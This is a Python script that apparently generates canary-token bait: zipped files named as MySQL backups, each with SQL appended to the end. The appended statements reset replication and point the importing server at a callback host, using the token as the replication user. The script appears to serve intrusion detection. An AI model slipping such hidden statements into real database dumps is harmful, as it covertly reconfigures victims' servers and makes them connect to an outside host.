from urllib.parse import urlparse
from pathlib import Path
from zipfile import ZipFile, ZIP_DEFLATED

DOWNLOADS_DIR = Path("static/downloads")
TEMP_DIR      = Path("static/baits/mysql/tmp")

def mysql_dump_bait(token: str, callback_host: str, port: int,  template: Path):

    host = callback_host
    port = port

    payload = f"""
-- DBBD sql Payload
STOP SLAVE;
RESET SLAVE ALL;
SET @bb = CONCAT(
    "CHANGE MASTER TO ",
    "MASTER_HOST='{host}', ",
    "MASTER_PORT={port}, ",
    "MASTER_USER='{token}', ",
    "MASTER_PASSWORD='dbbd-sql-bait', ",
    "MASTER_SSL=0, ",
    "MASTER_CONNECT_RETRY=1;"
);
PREPARE stmt FROM @bb;
EXECUTE stmt;
START SLAVE;
STOP SLAVE;
"""
    with open(template, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

    content = content + payload

    output_path = TEMP_DIR / f"Backup_{token}{template.suffix}"

    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(content)

    return output_path # static/baits/mysql/tmp


def sql_bait(token: str, callback_host: str, port: int, template_path: Path):
    temp_bait =  mysql_dump_bait(token=token, callback_host=callback_host, port=port, template=Path(template_path))
    
    zip_name = f"Backup_{token}.zip"
    out_zip  = DOWNLOADS_DIR / zip_name

    with ZipFile(out_zip, "w", ZIP_DEFLATED) as zf:
        zf.write(temp_bait, arcname=f"backup_{token}.sql")
    
    # Cleaning up the file temp
    temp_bait.unlink()

    return zip_name


if __name__ == "__main__":
    token    = "123456789"
    template = "sql_dump.sql"
    port = 3308
    host = "dbbd.com"

    sql_bait(token,host, port, template)
    print(f"Generated: {token}.sql")